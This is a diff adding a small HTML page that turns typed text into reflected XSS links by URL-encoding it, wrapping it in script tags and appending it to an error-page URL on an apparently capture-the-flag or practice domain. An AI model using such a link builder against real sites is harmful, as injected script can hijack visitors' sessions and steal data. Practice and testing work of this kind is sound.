@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<style>
+    body {
+        width: 100%;
+    }
+</style>
+
+<body>
+    <textarea type="text" id="input"></textarea>
+    <p id="output" style="width: 500px;"></p>
+    <script>
+        const url = 'https://obxssession.hackthe.space/error?m=theoryprivate&p=';
+        const out = document.getElementById("output");
+
+        const input = document.getElementById("input").addEventListener('change', function() {
+            out.innerText = url + "<script\>" + this.value.replace(/ /g, "%20").replace(/\n/g,"").replace(/&/g, "%26").replace(/=/g, "%3D") + '\</script\>';
+        })
+        
+    </script>
+</body>
+</html>
